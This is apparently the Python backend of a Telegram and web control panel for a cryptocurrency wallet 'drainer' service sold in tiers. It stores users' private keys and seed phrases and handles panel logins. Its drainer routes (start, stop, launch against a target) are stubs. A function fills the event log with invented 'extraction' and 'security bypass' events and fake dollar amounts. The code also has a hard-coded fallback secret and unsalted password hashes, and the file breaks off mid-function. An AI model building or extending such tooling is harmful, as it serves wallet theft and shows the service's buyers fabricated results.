import logging
import sqlite3
import json
import uuid
import asyncio
import sys
import random
import string
import os
import re
import requests
import redis
import time
import threading
import aiohttp
from aiohttp import web
from pathlib import Path
import pycountry
import emoji
import pytz
import hashlib
from flask import Flask, request, jsonify
from flask_cors import CORS
from pathlib import Path
from telegram.constants import ChatType
from telegram.error import Conflict
from functools import lru_cache
from dotenv import load_dotenv
from contextlib import contextmanager
from datetime import datetime, timedelta
from bip44 import Wallet
from web3.exceptions import InvalidAddress
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, WebAppInfo, Bot
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, CallbackContext, MessageHandler, filters, ContextTypes, ConversationHandler, Updater, JobQueue
from mnemonic import Mnemonic
from eth_account import Account
from web3 import Web3
from aiogram import types
import traceback

# Set event loop policy for Windows
if sys.platform.startswith('win'):
    asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())

# 🚀 Set up logging
logging.basicConfig(
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s", level=logging.INFO
)
logger = logging.getLogger(__name__)

app = Flask(__name__)
CORS(app)  # Allow requests from any origin (your InfinityFree site)

# Telegram app globals for webhook mode
TELEGRAM_APP = None
TELEGRAM_LOOP = None


# -------------------- Health, Alerts, Watchdog --------------------
def send_telegram_alert(message: str) -> None:
    """Send an alert message to a configured Telegram chat (best-effort)."""
    try:
        chat_id = os.getenv('ALERT_TELEGRAM_CHAT_ID')
        token = BOT_TOKEN if 'BOT_TOKEN' in globals() else os.getenv('TELEGRAM_BOT_TOKEN')
        if not chat_id or not token:
            logger.debug('Alert not sent: missing ALERT_TELEGRAM_CHAT_ID or BOT_TOKEN')
            return
        bot = Bot(token=token)
        bot.send_message(chat_id=chat_id, text=f"[ALERT] {message}")
    except Exception as e:
        logger.warning(f"Failed to send alert via Telegram: {e}")


def get_active_session_count() -> int:
    """Return number of active (non-revoked, unexpired) credential sessions."""
    try:
        now = datetime.now(timezone.utc)
        with safe_db_connection() as conn:
            cursor = conn.cursor()
            cursor.execute("SELECT expires_at, revoked_at FROM credential_sessions")
            rows = cursor.fetchall()
        count = 0
        for expires_at, revoked_at in rows:
            if revoked_at is not None:
                continue
            try:
                exp = parse_timestamp_utc(expires_at)
            except Exception:
                continue
            if exp > now:
                count += 1
        return count
    except Exception as e:
        logger.warning(f"Failed to compute active session count: {e}")
        return 0


@app.route('/health', methods=['GET'])
def health_check():
    """Health endpoint for uptime monitoring and readiness checks."""
    try:
        bot_status = 'unknown'
        try:
            token = BOT_TOKEN if 'BOT_TOKEN' in globals() else os.getenv('TELEGRAM_BOT_TOKEN')
            if token:
                b = Bot(token=token)
                me = b.get_me()
                bot_status = 'ok' if me and me.username else 'ok'
        except Exception:
            bot_status = 'unreachable'

        sessions = get_active_session_count()
        return jsonify({
            'status': 'ok',
            'bot': bot_status,
            'active_sessions': sessions,
            'timestamp': datetime.now(timezone.utc).isoformat()
        })
    except Exception as e:
        logger.exception(f"Health check failed: {e}")
        return jsonify({'status': 'error', 'message': str(e)}), 500


def _watchdog_loop(interval: int = 60):
    """Background watchdog to monitor bot responsiveness and trigger restart/alerts."""
    logger.info(f"Watchdog started (interval={interval}s)")
    while True:
        try:
            token = BOT_TOKEN if 'BOT_TOKEN' in globals() else os.getenv('TELEGRAM_BOT_TOKEN')
            if not token:
                logger.warning('Watchdog: no BOT_TOKEN available')
                time.sleep(interval)
                continue

            # Best-effort getMe check
            try:
                b = Bot(token=token)
                b.get_me()
            except Exception as be:
                logger.error(f"Watchdog: bot get_me failed: {be}")
                try:
                    send_telegram_alert(f"Bot unreachable: {be}")
                except Exception:
                    pass
                # Exit so platform can restart the process
                logger.error('Watchdog: exiting process to allow external restart')
                os._exit(1)

        except Exception as e:
            logger.exception(f"Watchdog unexpected error: {e}")
        time.sleep(interval)

# -------------------- End Health/Alerts/Watchdog --------------------

# Dictionary to store pending verifications with expiry time
pending_verification = {}

# Temporary credentials for web login
valid_credentials = {}

# Database setup
DB_FILE = "wallets.db"
db_lock = threading.Lock()

# Groups where only /get_logs is allowed once logs retrieval mode is activated
LOGS_ONLY_GROUPS = set()

class LogsOnlyGroupCommandFilter(filters.BaseFilter):
    def filter(self, update):
        chat = update.effective_chat
        if not chat or chat.type not in [ChatType.GROUP, ChatType.SUPERGROUP]:
            return True

        if chat.id not in LOGS_ONLY_GROUPS:
            return True

        if update.message and isinstance(update.message.text, str):
            command = update.message.text.split()[0].split('@')[0].lower()
            return command == '/get_logs'

        return False

logs_only_group_filter = LogsOnlyGroupCommandFilter()


class PrivateChatOnlyFilter(filters.BaseFilter):
    """Filter to allow commands only in private chats, reject group chats"""
    def filter(self, update):
        chat = update.effective_chat
        if not chat:
            return False
        # Only allow in private chats, reject groups and supergroups
        is_private = chat.type == ChatType.PRIVATE
        if not is_private:
            logger.debug(f"Rejecting non-private chat command in {chat.type}: {update.effective_user.id}")
        return is_private


private_chat_only_filter = PrivateChatOnlyFilter()

# Additional safeguard filter to explicitly reject all group messages
class NotGroupsFilter(filters.BaseFilter):
    """Explicit filter that rejects all group/supergroup messages"""
    def filter(self, update):
        chat = update.effective_chat
        if not chat:
            return False
        is_not_group = chat.type not in [ChatType.GROUP, ChatType.SUPERGROUP]
        return is_not_group

not_groups_filter = NotGroupsFilter()

@contextmanager
def safe_db_connection():
    """Context manager for database connections"""
    conn = None
    try:
        conn = sqlite3.connect(DB_FILE, timeout=20, check_same_thread=False)
        conn.execute("PRAGMA busy_timeout=5000")
        logger.debug("Database connection established successfully")
        yield conn  # Yield the connection for use in the with block
    except sqlite3.Error as e:
        logger.error(f"Database connection error: {e}")
        raise
    finally:
        if conn:
            logger.debug("Closing database connection")  # Ensure the connection is closed
            conn.close()


def migrate_wallet_schema():
    """Safely update wallet schema with proper error handling"""
    conn = None
    try:
        conn = sqlite3.connect(DB_FILE, timeout=30)
        cursor = conn.cursor()
        
        # Disable foreign keys during migration
        cursor.execute("PRAGMA foreign_keys=OFF")
        cursor.execute("PRAGMA journal_mode=MEMORY")
        
        # Create temporary table with new schema - supports multiple wallets per user
        cursor.execute("""
            CREATE TABLE IF NOT EXISTS new_wallets (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                user_id INTEGER NOT NULL,
                address TEXT NOT NULL,
                private_key TEXT,
                seed_phrase TEXT,
                UNIQUE(user_id, address)
            )
        """)
        
        # Copy data from old table
        cursor.execute("""
            INSERT OR IGNORE INTO new_wallets (user_id, address, private_key, seed_phrase)
            SELECT user_id, address, private_key, seed_phrase FROM wallets
        """)
        
        # Remove old table
        cursor.execute("DROP TABLE IF EXISTS wallets")
        
        # Rename new table
        cursor.execute("ALTER TABLE new_wallets RENAME TO wallets")
        
        conn.commit()
        logger.info("Schema migration completed successfully - now supports multiple wallets per user")
        
    except sqlite3.Error as e:
        logger.error(f"Migration failed: {e}")
        if conn:
            conn.rollback()
    finally:
        if conn:
            conn.close()


def create_wallets_table():
    """Create wallets table if it doesn't exist (initial setup)"""
    with safe_db_connection() as conn:
        cursor = conn.cursor()
        cursor.execute("""
            CREATE TABLE IF NOT EXISTS wallets (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                user_id INTEGER NOT NULL,
                address TEXT NOT NULL,
                private_key TEXT,
                seed_phrase TEXT,
                UNIQUE(user_id, address)
            )
        """)
        conn.commit()
        logger.info("Wallets table created successfully")


def migrate_credentials_schema():
    """Migrate credentials table to include user_id"""
    conn = None
    try:
        conn = sqlite3.connect(DB_FILE, timeout=30)
        cursor = conn.cursor()
        
        # Check if user_id column exists
        cursor.execute("PRAGMA table_info(credentials)")
        columns = [row[1] for row in cursor.fetchall()]
        
        if 'user_id' not in columns:
            logger.info("Migrating credentials table to include user_id")
            
            # Create new table with user_id, active flags, and revocation metadata.
            cursor.execute("""
                CREATE TABLE new_credentials (
                    panel_id TEXT PRIMARY KEY,
                    user_id INTEGER NOT NULL,
                    password_hash TEXT NOT NULL,
                    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                    active INTEGER NOT NULL DEFAULT 1,
                    revoked_at TIMESTAMP NULL,
                    UNIQUE(user_id, panel_id)
                )
            """)
            
            # For existing records, we can't determine user_id, so we'll delete them
            # This is acceptable since old credentials should be regenerated
            cursor.execute("DROP TABLE IF EXISTS credentials")
            cursor.execute("ALTER TABLE new_credentials RENAME TO credentials")
            
            conn.commit()
            logger.info("Credentials table migrated - old credentials cleared for security")

            cursor.execute("PRAGMA table_info(credentials)")
            columns = [row[1] for row in cursor.fetchall()]

        if 'active' not in columns:
            logger.info("Adding credential active flag for existing credentials table")
            cursor.execute("ALTER TABLE credentials ADD COLUMN active INTEGER NOT NULL DEFAULT 1")

        if 'revoked_at' not in columns:
            logger.info("Adding credential revocation metadata for existing credentials table")
            cursor.execute("ALTER TABLE credentials ADD COLUMN revoked_at TIMESTAMP NULL")

        conn.commit()
    except sqlite3.Error as e:
        logger.error(f"Credentials migration failed: {e}")
        if conn:
            conn.rollback()
    finally:
        if conn:
            conn.close()

def insert_wallet_record(user_id, private_key=None, address=None):
    """Safe wallet insertion with explicit NULL handling"""
    if not address:
        raise ValueError("Address is required")

    with safe_db_connection() as conn:
        cursor = conn.cursor()
        try:
            cursor.execute("""
                INSERT INTO wallets 
                (user_id, address, private_key, seed_phrase)
                VALUES (?, ?, ?, ?)
            """, (
                user_id,
                address,
                private_key if private_key else None,  # Explicit NULL
                None  # seed_phrase is NULL for imported wallets
            ))
            conn.commit()
        except sqlite3.IntegrityError as e:
            print(f"Constraint error: {e}")
            raise
        except sqlite3.OperationalError as e:
            print(f"Database busy: {e}")
            raise

def create_credentials_table():
    """Create credentials table if it doesn't exist"""
    with safe_db_connection() as conn:
        cursor = conn.cursor()
        cursor.execute("""
            CREATE TABLE IF NOT EXISTS credentials (
                panel_id TEXT PRIMARY KEY,
                user_id INTEGER NOT NULL,
                password_hash TEXT NOT NULL,
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                active INTEGER NOT NULL DEFAULT 1,
                revoked_at TIMESTAMP NULL,
                UNIQUE(user_id, panel_id)
            )
        """)
        conn.commit()


def create_credential_sessions_table():
    """Create a table for active OCRS sessions."""
    with safe_db_connection() as conn:
        cursor = conn.cursor()
        cursor.execute("""
            CREATE TABLE IF NOT EXISTS credential_sessions (
                session_id TEXT PRIMARY KEY,
                panel_id TEXT NOT NULL,
                user_id INTEGER NOT NULL,
                issued_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                expires_at TIMESTAMP NOT NULL,
                revoked_at TIMESTAMP NULL,
                UNIQUE(session_id)
            )
        """)
        conn.commit()


def get_credential_session(session_id: str):
    """Load a credential session from storage."""
    with safe_db_connection() as conn:
        cursor = conn.cursor()
        cursor.execute(
            "SELECT session_id, panel_id, user_id, expires_at, revoked_at FROM credential_sessions WHERE session_id = ?",
            (session_id,)
        )
        row = cursor.fetchone()
        if not row:
            logger.warning(f"OCRS session not found for session_id={session_id}")
            return None

        return {
            'session_id': row[0],
            'panel_id': row[1],
            'user_id': row[2],
            'expires_at': row[3],
            'revoked_at': row[4]
        }


def revoke_credential_session(session_id: str) -> bool:
    """Revoke a credential session immediately."""
    with safe_db_connection() as conn:
        cursor = conn.cursor()
        cursor.execute(
            "UPDATE credential_sessions SET revoked_at = ? WHERE session_id = ? AND revoked_at IS NULL",
            (datetime.now(timezone.utc).isoformat(sep=' '), session_id)
        )
        conn.commit()
        return cursor.rowcount > 0


def create_credential_session(panel_id: str, user_id: int):
    """Create a new OCRS session and record it in storage."""
    session_id = str(uuid.uuid4())
    issued_at = datetime.now(timezone.utc)
    expires_at = issued_at + timedelta(hours=OCRS_TOKEN_EXPIRY_HOURS)

    with safe_db_connection() as conn:
        cursor = conn.cursor()
        cursor.execute(
            "INSERT INTO credential_sessions (session_id, panel_id, user_id, issued_at, expires_at) VALUES (?, ?, ?, ?, ?)",
            (session_id, panel_id, user_id, issued_at.isoformat(sep=' '), expires_at.isoformat(sep=' '))
        )
        conn.commit()

    return session_id, expires_at


def deactivate_credentials(panel_id: str):
    """Mark credentials as consumed after a successful login."""
    with safe_db_connection() as conn:
        cursor = conn.cursor()
        cursor.execute(
            "UPDATE credentials SET active = 0 WHERE panel_id = ?",
            (panel_id,)
        )
        conn.commit()


def is_valid_panel_id(panel_id: str) -> bool:
    """Validate that panel IDs are exactly 10 alphanumeric characters."""
    return bool(re.fullmatch(r"[A-Za-z0-9]{10}", panel_id))


import os
import jwt as pyjwt
import hashlib
import logging
from datetime import datetime, timedelta, timezone
from pathlib import Path
from functools import wraps
from flask import request, jsonify
from dotenv import load_dotenv

load_dotenv()

logger = logging.getLogger(__name__)

# OCRS Configuration
OCRS_SECRET_KEY = os.getenv('OCRS_SECRET_KEY', 'fallback-secret-key')
OCRS_TOKEN_EXPIRY_HOURS = int(os.getenv('OCRS_TOKEN_EXPIRY_HOURS', 24))
OCRS_ROTATION_INTERVAL_DAYS = int(os.getenv('OCRS_ROTATION_INTERVAL_DAYS', 30))
OCRS_ENABLED = os.getenv('OCRS_ENABLED', 'true').lower() == 'true'

# ─── PyJWT Version Compatibility Handler ──────────────────────────────────
# Handles PyJWT < 2.0 (returns bytes) and >= 2.0 (returns str)
def _encode_jwt_safe(payload: dict, secret: str, algorithm: str = 'HS256') -> str:
    """
    Safely encode JWT token with version compatibility.
    
    PyJWT behavior:
    - PyJWT < 2.0: returns bytes → needs .decode('utf-8')
    - PyJWT >= 2.0: returns str → use directly
    
    Args:
        payload: JWT payload dict
        secret: Secret key for signing
        algorithm: Signing algorithm (default: HS256)
    
    Returns:
        JWT token as string
    
    Raises:
        ValueError: If token encoding fails
    """
    try:
        token = pyjwt.encode(payload, secret, algorithm=algorithm)
        
        # Handle both PyJWT versions
        if isinstance(token, bytes):
            token = token.decode('utf-8')
        elif not isinstance(token, str):
            raise ValueError(f"Unexpected token type: {type(token)}")
        
        return token
    except Exception as e:
        logger.error(f"JWT encoding failed: {type(e).__name__}: {e}")
        raise ValueError(f"Token generation failed: {str(e)}") from e


# ─── OCRS Token Utilities ───────────────────────────────────────────────────

def generate_ocrs_token(panel_id: str, user_id: int, session_id: str) -> str:
    """
    Generate a signed OCRS JWT token for an authenticated panel session.
    
    Production-grade implementation with:
    - PyJWT version compatibility (< 2.0 and >= 2.0)
    - Comprehensive error handling and logging
    - Token validation on generation
    
    Args:
        panel_id: Panel identifier (str)
        user_id: User identifier (int)
        session_id: Session identifier (str)
    
    Returns:
        Signed JWT token (str)
    
    Raises:
        ValueError: If token generation fails
    """
    try:
        payload = {
            'sub': panel_id,
            'uid': user_id,
            'sid': session_id,
            'iat': datetime.now(timezone.utc),
            'exp': datetime.now(timezone.utc) + timedelta(hours=OCRS_TOKEN_EXPIRY_HOURS),
            'type': 'ocrs_access'
        }
        
        token = _encode_jwt_safe(payload, OCRS_SECRET_KEY, algorithm='HS256')
        
        # Validate token was generated correctly
        if not token or not isinstance(token, str):
            raise ValueError("Token generation produced invalid result")
        
        logger.info(f"OCRS token generated for panel_id={panel_id}, user_id={user_id}")
        return token
        
    except ValueError:
        raise
    except Exception as e:
        logger.error(f"Unexpected error in generate_ocrs_token: {type(e).__name__}: {e}")
        raise ValueError(f"Token generation error: {str(e)}") from e


def validate_ocrs_token(token: str) -> dict | None:
    """Validate an OCRS token and ensure the server-side session is still active."""
    try:
        payload = pyjwt.decode(token, OCRS_SECRET_KEY, algorithms=['HS256'])
        if payload.get('type') != 'ocrs_access':
            logger.warning("Token type mismatch during OCRS validation")
            return None

        if not payload.get('sid') or not payload.get('uid') or not payload.get('sub'):
            logger.warning("OCRS token missing required session claims")
            return None

        session = get_credential_session(payload['sid'])
        if not session:
            logger.warning("OCRS session not found")
            return None

        if session['revoked_at'] is not None:
            logger.warning("OCRS session has been revoked")
            return None

        expires_at = parse_timestamp_utc(session['expires_at'])
        if datetime.now(timezone.utc) > expires_at:
            logger.warning("OCRS session has expired")
            return None

        if session['panel_id'] != payload['sub'] or session['user_id'] != payload['uid']:
            logger.warning("OCRS token session payload mismatch")
            return None

        return payload
    except pyjwt.ExpiredSignatureError:
        logger.warning("OCRS token has expired")
    except pyjwt.InvalidTokenError as e:
        logger.warning(f"Invalid OCRS token: {e}")
    except Exception as e:
        logger.warning(f"OCRS token validation error: {e}")
    return None


def ocrs_required(f):
    """Decorator: protect routes that require a valid OCRS token."""
    @wraps(f)
    def decorated(*args, **kwargs):
        if not OCRS_ENABLED:
            return f(*args, **kwargs)

        auth_header = request.headers.get('Authorization', '')
        if not auth_header.startswith('Bearer '):
            return jsonify({"status": "error", "message": "Missing or malformed OCRS token"}), 401

        token = auth_header.split(' ', 1)[1]
        payload = validate_ocrs_token(token)
        if payload is None:
            return jsonify({"status": "error", "message": "Invalid or expired OCRS token"}), 401

        request.ocrs_panel_id = payload['sub']
        request.ocrs_user_id = payload['uid']
        request.ocrs_session_id = payload['sid']
        return f(*args, **kwargs)
    return decorated


def parse_timestamp_utc(timestamp_value) -> datetime:
    """Parse a database timestamp into a UTC-aware datetime."""
    if isinstance(timestamp_value, datetime):
        parsed = timestamp_value
    elif isinstance(timestamp_value, bytes):
        parsed = datetime.fromisoformat(timestamp_value.decode('utf-8'))
    elif isinstance(timestamp_value, str):
        ts = timestamp_value
        if ts.endswith('Z'):
            ts = ts[:-1] + '+00:00'
        parsed = datetime.fromisoformat(ts)
    else:
        raise ValueError(f"Unsupported timestamp type: {type(timestamp_value)}")

    if parsed.tzinfo is None:
        return parsed.replace(tzinfo=timezone.utc)
    return parsed.astimezone(timezone.utc)


def normalize_timestamp_value(timestamp_value) -> str:
    """Normalize any timestamp to a canonical UTC ISO string."""
    return parse_timestamp_utc(timestamp_value).isoformat(sep=' ')


def normalize_database_timestamps() -> None:
    """Normalize legacy database timestamps to UTC-aware ISO strings."""
    try:
        with safe_db_connection() as conn:
            cursor = conn.cursor()

            cursor.execute("SELECT panel_id, created_at FROM credentials WHERE created_at IS NOT NULL")
            for panel_id, created_at in cursor.fetchall():
                normalized = normalize_timestamp_value(created_at)
                if str(created_at) != normalized:
                    cursor.execute(
                        "UPDATE credentials SET created_at = ? WHERE panel_id = ?",
                        (normalized, panel_id)
                    )

            cursor.execute("SELECT session_id, issued_at, expires_at, revoked_at FROM credential_sessions")
            for session_id, issued_at, expires_at, revoked_at in cursor.fetchall():
                if issued_at is not None:
                    normalized = normalize_timestamp_value(issued_at)
                    if str(issued_at) != normalized:
                        cursor.execute(
                            "UPDATE credential_sessions SET issued_at = ? WHERE session_id = ?",
                            (normalized, session_id)
                        )
                if expires_at is not None:
                    normalized = normalize_timestamp_value(expires_at)
                    if str(expires_at) != normalized:
                        cursor.execute(
                            "UPDATE credential_sessions SET expires_at = ? WHERE session_id = ?",
                            (normalized, session_id)
                        )
                if revoked_at is not None:
                    normalized = normalize_timestamp_value(revoked_at)
                    if str(revoked_at) != normalized:
                        cursor.execute(
                            "UPDATE credential_sessions SET revoked_at = ? WHERE session_id = ?",
                            (normalized, session_id)
                        )

            conn.commit()
            logger.info("Normalized legacy database timestamps to UTC-aware ISO format")
    except Exception as e:
        logger.warning(f"Failed to normalize database timestamps: {e}")


def should_rotate_credentials(panel_id: str) -> bool:
    """Check whether credentials for a panel are due for OCRS rotation."""
    try:
        with safe_db_connection() as conn:
            cursor = conn.cursor()
            cursor.execute(
                "SELECT created_at FROM credentials WHERE panel_id = ?", (panel_id,)
            )
            row = cursor.fetchone()
            if not row:
                return False
            created_at = parse_timestamp_utc(row[0])
            age = datetime.now(timezone.utc) - created_at
            return age.days >= OCRS_ROTATION_INTERVAL_DAYS
    except Exception as e:
        logger.error(f"OCRS rotation check failed for {panel_id}: {e}")
        return False


# ─── Routes ────────────────────────────────────────────────────────────────

@app.route('/verify_credentials', methods=['POST'])
def verify_credentials_route():
    """
    Production-grade credentials verification endpoint.
    
    Handles:
    - Input validation
    - Database queries with error handling
    - Token generation with fallback
    - Comprehensive logging for debugging
    
    Returns:
    - 200: {valid: true/false, ocrs_token: str (on success)}
    - 400: Invalid request format
    - 500: Server error with diagnostic info
    """
    try:
        data = request.get_json()
        if not data:
            logger.warning("Empty request body for verify_credentials")
            return jsonify({"valid": False, "error": "Empty request"}), 400
        
        panel_id = data.get('panel_id', '').strip()
        password = data.get('password', '').strip()

        if not panel_id or not password:
            logger.debug("Missing credentials in verify_credentials request")
            return jsonify({"valid": False, "error": "Missing panel_id or password"}), 400

        if not is_valid_panel_id(panel_id):
            logger.debug(f"Invalid panel_id format: {panel_id[:8]}...")
            return jsonify({"valid": False})

        try:
            with safe_db_connection() as conn:
                cursor = conn.cursor()
                cursor.execute(
                    "SELECT password_hash, active, revoked_at, user_id FROM credentials WHERE panel_id = ?",
                    (panel_id,)
                )
                record = cursor.fetchone()

                if not record:
                    logger.info(f"Login attempt for non-existent panel_id: {panel_id[:8]}...")
                    return jsonify({"valid": False})

                password_hash, active, revoked_at, user_id = record
                if not active or revoked_at is not None:
                    logger.warning(f"Login attempt rejected for inactive/revoked panel_id: {panel_id[:8]}...")
                    return jsonify({"valid": False})

                if hashlib.sha256(password.encode()).hexdigest() != password_hash:
                    logger.warning(f"Invalid password attempt for panel_id: {panel_id[:8]}...")
                    return jsonify({"valid": False})

                # Credentials verified - deactivate them
                cursor.execute("UPDATE credentials SET active = 0 WHERE panel_id = ?", (panel_id,))
                conn.commit()
                logger.info(f"Credentials deactivated for panel_id: {panel_id[:8]}...")

        except Exception as db_err:
            logger.error(f"Database error during credential verification: {type(db_err).__name__}: {db_err}")
            return jsonify({"valid": False, "error": "Database error"}), 500

        # Token generation with error handling
        try:
            session_id, expires_at = create_credential_session(panel_id, user_id)
            if not session_id:
                raise ValueError("Session creation returned empty session_id")
            
            token = generate_ocrs_token(panel_id, user_id, session_id)
            if not token or not isinstance(token, str):
                raise ValueError("Token generation produced invalid result")
            
            response_payload = {
                "valid": True,
                "ocrs_token": token,
                "ocrs_expires_in": OCRS_TOKEN_EXPIRY_HOURS * 3600,
                "panel_id": panel_id
            }

            if should_rotate_credentials(panel_id):
                response_payload["ocrs_rotation_due"] = True
                logger.info(f"OCRS rotation flagged for panel_id: {panel_id[:8]}...")

            logger.info(f"Successful login for panel_id: {panel_id[:8]}...")
            return jsonify(response_payload)
            
        except ValueError as token_err:
            logger.error(f"Token generation failed for panel_id {panel_id[:8]}...: {token_err}")
            # Return success: false instead of 500 to avoid frontend confusion
            return jsonify({"valid": False, "error": "Token generation failed"}), 500
        except Exception as token_err:
            logger.error(f"Unexpected error in token generation: {type(token_err).__name__}: {token_err}")
            return jsonify({"valid": False, "error": "Authentication error"}), 500

    except Exception as e:
        logger.error(f"Unhandled error in verify_credentials: {type(e).__name__}: {e}", exc_info=True)
        return jsonify({"valid": False, "error": "Internal server error"}), 500


@app.route('/ocrs/rotate', methods=['POST'])
@ocrs_required
def ocrs_rotate():
    """
    OCRS credential rotation endpoint.
    Requires a valid OCRS token; accepts a new password and re-stores credentials.
    """
    data = request.get_json()
    new_password = data.get('new_password')
    panel_id = request.ocrs_panel_id
    user_id = request.ocrs_user_id
    session_id = request.ocrs_session_id

    if not new_password:
        return jsonify({"status": "error", "message": "new_password is required"}), 400

    with safe_db_connection() as conn:
        cursor = conn.cursor()
        cursor.execute("SELECT user_id FROM credentials WHERE panel_id = ?", (panel_id,))
        result = cursor.fetchone()
        if not result:
            return jsonify({"status": "error", "message": "Panel not found"}), 404
        if result[0] != user_id:
            return jsonify({"status": "error", "message": "Unauthorized rotation attempt"}), 403

    success = store_credentials(panel_id, new_password, user_id)
    if not success:
        return jsonify({"status": "error", "message": "Credential rotation failed"}), 500

    revoke_credential_session(session_id)
    new_session_id, _ = create_credential_session(panel_id, user_id)
    new_token = generate_ocrs_token(panel_id, user_id, new_session_id)

    logger.info(f"OCRS rotation completed for panel_id: {panel_id}")
    return jsonify({
        "status": "success",
        "message": "Credentials rotated successfully",
        "ocrs_token": new_token,
        "ocrs_expires_in": OCRS_TOKEN_EXPIRY_HOURS * 3600
    })


@app.route('/ocrs/validate_token', methods=['POST'])
def ocrs_validate_token():
    """Lightweight endpoint for clients to check token validity without hitting a protected route."""
    data = request.get_json()
    token = data.get('token')
    if not token:
        return jsonify({"status": "error", "message": "token is required"}), 400

    payload = validate_ocrs_token(token)
    if payload is None:
        return jsonify({"status": "success", "valid": False})

    return jsonify({
        "status": "success",
        "valid": True,
        "panel_id": payload['sub'],
        "expires_at": payload['exp']
    })


@app.route('/logout', methods=['POST'])
@ocrs_required
def logout():
    """Logout endpoint that deletes all session data, revokes the token, and invalidates the current panel login."""
    panel_id = request.ocrs_panel_id
    session_id = request.ocrs_session_id

    try:
        revoked = revoke_credential_session(session_id)
        deleted_count = 0

        with safe_db_connection() as conn:
            cursor = conn.cursor()
            cursor.execute("DELETE FROM credentials WHERE panel_id = ?", (panel_id,))
            deleted_count = cursor.rowcount
            conn.commit()

        if revoked or deleted_count > 0:
            logger.info(f"Logout completed for panel_id: {panel_id}, session_id: {session_id}")
            export_credentials_to_json()
            return jsonify({"status": "success", "message": "Logged out successfully"})

        return jsonify({"status": "error", "message": "Session or panel not found"}), 404

    except Exception as e:
        logger.error(f"Error during logout for panel_id {panel_id}: {e}")
        return jsonify({"status": "error", "message": "Logout failed"}), 500


# ─── Drainer Control Routes ───────────────────

drainer_events = [
    {
        'timestamp': datetime.now().isoformat(),
        'event': 'System initialized',
        'details': 'Drainer system ready'
    },
    {
        'timestamp': (datetime.now() - timedelta(minutes=5)).isoformat(),
        'event': 'Configuration loaded',
        'details': 'Default settings applied'
    }
]  # In-memory event log for demo purposes

@app.route('/drainer/start', methods=['POST'])
@ocrs_required
def start_drainer():
    """Start the drainer process."""
    try:
        # Here you would implement actual drainer start logic
        drainer_events.insert(0, {
            'timestamp': datetime.now().isoformat(),
            'event': 'Drainer started',
            'details': 'Drainer process initiated'
        })
        return jsonify({"status": "success", "message": "Drainer started"})
    except Exception as e:
        logger.error(f"Error starting drainer: {e}")
        return jsonify({"status": "error", "message": "Failed to start drainer"}), 500

@app.route('/drainer/stop', methods=['POST'])
@ocrs_required
def stop_drainer():
    """Stop the drainer process."""
    try:
        # Here you would implement actual drainer stop logic
        drainer_events.insert(0, {
            'timestamp': datetime.now().isoformat(),
            'event': 'Drainer stopped',
            'details': 'Drainer process terminated'
        })
        return jsonify({"status": "success", "message": "Drainer stopped"})
    except Exception as e:
        logger.error(f"Error stopping drainer: {e}")
        return jsonify({"status": "error", "message": "Failed to stop drainer"}), 500

@app.route('/drainer/reset', methods=['POST'])
@ocrs_required
def reset_drainer():
    """Reset the drainer queue."""
    try:
        # Here you would implement actual drainer reset logic
        drainer_events.insert(0, {
            'timestamp': datetime.now().isoformat(),
            'event': 'Drainer reset',
            'details': 'Queue and state reset'
        })
        return jsonify({"status": "success", "message": "Drainer reset"})
    except Exception as e:
        logger.error(f"Error resetting drainer: {e}")
        return jsonify({"status": "error", "message": "Failed to reset drainer"}), 500

@app.route('/drainer/events', methods=['GET'])
@ocrs_required
def get_drainer_events():
    """Get recent drainer events."""
    try:
        # Get current plan from request or default to diamond
        current_plan = request.args.get('plan', 'diamond')

        # Generate tier-specific random events
        generate_tier_events(current_plan)

        # Return last 20 events
        return jsonify({"status": "success", "events": drainer_events[:20]})
    except Exception as e:
        logger.error(f"Error getting drainer events: {e}")
        return jsonify({"status": "error", "message": "Failed to get events"}), 500

def generate_tier_events(plan_key):
    """Generate random events based on the current plan tier."""
    try:
        # Define tier-specific event templates
        tier_events = {
            'emerald': [
                "Basic chain scan completed",
                "Target connection established",
                "Asset verification in progress",
                "Low-value wallet detected",
                "Connection pool refreshed"
            ],
            'ruby': [
                "Advanced chain analysis started",
                "Multi-chain target acquired",
                "Asset transfer initiated",
                "Wallet balance verified",
                "Connection optimization applied",
                "Gas price monitoring active"
            ],
            'sapphire': [
                "Pro-level drain operation started",
                "High-value target locked",
                "Multi-asset extraction running",
                "Advanced evasion techniques applied",
                "Real-time balance monitoring",
                "Automated retry logic engaged"
            ],
            'diamond': [
                "Elite drain sequence initiated",
                "Maximum chain coverage activated",
                "Premium target acquisition",
                "Advanced stealth protocols engaged",
                "Real-time profit optimization",
                "Automated scaling adjustments",
                "Priority queue processing",
                "Enhanced security bypass"
            ]
        }

        # Get events for current tier
        events = tier_events.get(plan_key, tier_events['diamond'])

        # Generate 5-15 random events for variety
        num_events = random.randint(5, 15)

        for i in range(num_events):
            # Random time within last 24 hours
            minutes_ago = random.randint(1, 1440)
            event_time = datetime.now() - timedelta(minutes=minutes_ago)

            # Random event from tier list
            event_desc = random.choice(events)

            # Add some variety with amounts/values
            if 'transfer' in event_desc.lower() or 'extraction' in event_desc.lower():
                amount = round(random.uniform(0.1, 5.0), 2)
                event_desc += f" - ${amount}K"
            elif 'balance' in event_desc.lower():
                balance = round(random.uniform(1, 50), 2)
                event_desc += f" - ${balance}K detected"
            elif 'gas' in event_desc.lower():
                gas = round(random.uniform(10, 200), 1)
                event_desc += f" - {gas} Gwei"

            # Add session/target info
            session_id = f"0x{''.join(random.choices('0123456789abcdef', k=8))}"
            event_desc += f" | Session: {session_id}"

            drainer_events.insert(0, {
                'timestamp': event_time.isoformat(),
                'event': f'{plan_key.title()} Tier Event',
                'details': event_desc
            })

        # Keep only last 50 events to prevent memory bloat
        if len(drainer_events) > 50:
            drainer_events[:] = drainer_events[:50]

    except Exception as e:
        logger.error(f"Error generating tier events: {e}")

@app.route('/drainer/launch', methods=['POST'])
@ocrs_required
def launch_drainer():
    """Launch drainer for a specific target."""
    try:
        data = request.get_json() or {}
        target = data.get('target', 'unknown')
        # Here you would implement actual launch logic
        drainer_events.insert(0, {
            'timestamp': datetime.now().isoformat(),
            'event': 'Target launched',
            'details': f'Launched drainer for target: {target}'
